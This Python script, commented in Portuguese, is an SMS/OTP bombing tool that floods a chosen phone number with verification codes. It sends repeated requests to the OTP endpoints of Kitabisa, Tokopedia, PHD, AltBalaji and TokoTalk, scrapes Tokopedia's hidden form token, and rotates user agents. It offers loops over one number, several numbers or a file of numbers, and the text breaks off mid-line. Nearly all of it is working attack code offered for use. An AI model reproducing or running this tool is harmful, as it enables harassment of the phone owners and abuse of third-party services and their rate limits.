#!/usr/bin/python3
import requests
import random
import json
import time
import sys
import os
import re

# Definindo cores para melhor visualização
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'

# Classes para cada serviço de spam
class Spam:

    def __init__(self, number):
        self.number = number

    def spam_kitabisa(self):
        try:
            response = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.number}')
            if response.status_code == 200:
                return f'{h}Spam para Kitabisa {self.number} {h}Success!'
            else:
                return f'{m}Spam para Kitabisa {self.number} {m}Fail!'
        except Exception as e:
            return f'{m}Erro: {str(e)}'

    def spam_tokopedia(self):
        try:
            rands = random.choice(open('ua.txt').readlines()).split('\n')[0]
            headers = {
                'User-Agent': rands,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Origin': 'https://accounts.tokopedia.com',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
            regist = requests.get(
                f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.number}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{self.number}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',
                headers=headers).text
            Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
            formulir = {
                "otp_type": "116",
                "msisdn": self.number,
                "tk": Token,
                "email": '',
                "original_param": "",
                "user_id": "",
                "signature": "",
                "number_otp_digit": "6"
            }
            req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers,
                                data=formulir).text
            if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
                return f'{m}Spam para Tokopedia {self.number} {m}Fail!'
            else:
                return f'{h}Spam para Tokopedia {self.number} {h}Success!'
        except Exception as e:
            return f'{m}Erro: {str(e)}'

    def spam_phd(self):
        try:
            param = {'phone_number': self.number}
            r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
            if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
                return f'{h}Spam para PHD {self.number} {h}Success!'
            else:
                return f'{m}Spam para PHD {self.number} {m}Fail!'
        except Exception as e:
            return f'{m}Erro: {str(e)}'

    def spam_balaji(self):
        try:
            urlb = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
            kod = "62"
            ata = {
                "country_code": kod,
                "phone_number": self.number
            }
            head = {
                "Content-Length": f"{len(str(ata))}",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://lite.altbalaji.com",
                "Save-Data": "on",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
                "Content-Type": "application/json;charset=UTF-8",
                "Referer": "https://lite.altbalaji.com/subscribe?progress=input",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
            }
            req = requests.post(urlb, data=json.dumps(ata), headers=head)
            if '{"status":"ok"}' in req.text:
                return f'{h}Spam para Balaji {self.number} {h}Success!'
            else:
                return f'{m}Spam para Balaji {self.number} {m}Fail!'
        except Exception as e:
            return f'{m}Erro: {str(e)}'

    def spam_tokotalk(self):
        try:
            data = '{"key":"phone","value":"' + str(self.number) + '"}'
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
                "content-type": "application/json;charset=UTF-8"
            }
            if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data,
                                           headers=headers).text:
                return f'{h}Spam para TokoTalk {self.number} {h}Success!'
            else:
                return f'{m}Spam para TokoTalk {self.number} {m}Fail!'
        except Exception as e:
            return f'{m}Erro: {str(e)}'

# Função para perguntar ao usuário se deseja continuar ou não
def continuar():
    while True:
        lan = str(input(k + '\tDeseja continuar? y/n : ' + h))
        if lan.lower() == 'y':
            menu_spam()
        elif lan.lower() == 'n':
            print(p)
            break
        else:
            continue

# Função para ler números de telefone de um arquivo e iniciar o spam
def spam_arquivo():
    filename = input(k + '\tNome do arquivo: ' + h)
    if filename in os.listdir(os.getcwd()):
        lines = open(filename, 'r').readlines()
        total_spams = int(input(k + '\tTotal de spams: ' + h))
        delay = int(input(k + '\tAtraso (segundos): ' + h))
        for _ in range(total_spams):
            for line in lines:
                number = line.strip()
                z = Spam(number)
                print('\t' + z.spam_kitabisa())
                print('\t' + z.spam_tokopedia())
                print('\t' + z.spam_balaji())
                print('\t' + z.spam_phd())
                print('\t' + z.spam_tokotalk())
                time.sleep(delay)
        continuar()
    else:
        print(m + f'\tArquivo {filename} não existe')

# Função para spam em um único número
def spam_simples():
    number = input(k + '\tNúmero de telefone: ' + h)
    total_spams = int(input(k + '\tTotal de spams: ' + h))
    delay = int(input(k + '\tAtraso (segundos): ' + h))
    for _ in range(total_spams):
        z = Spam(number)
        print('\t' + z.spam_kitabisa())
        print('\t' + z.spam_tokopedia())
        print('\t' + z.spam_balaji())
        print('\t' + z.spam_phd())
        print('\t' + z.spam_tokotalk())
        time.sleep(delay)
    continuar()

# Função para spam em vários números
def spam_multiplo():
    numbers = []
    total_numbers = int(input(k + '\tTotal de números: ' + h))
    for i in range(total_numbers):
        numbers.append(input(k + f'\tNúmero {i + 1}: ' + h))
    total_spams = int(input(k + '\tTotal de spams: ' + h))
    delay = int(input(k + '\tAtraso (segundos): ' + h))
    for _ in range(total_spams):
        for number in numbers:
            z = Spam(number)
            print('\t' + z.spam_kitabisa())
            print('\t' + z
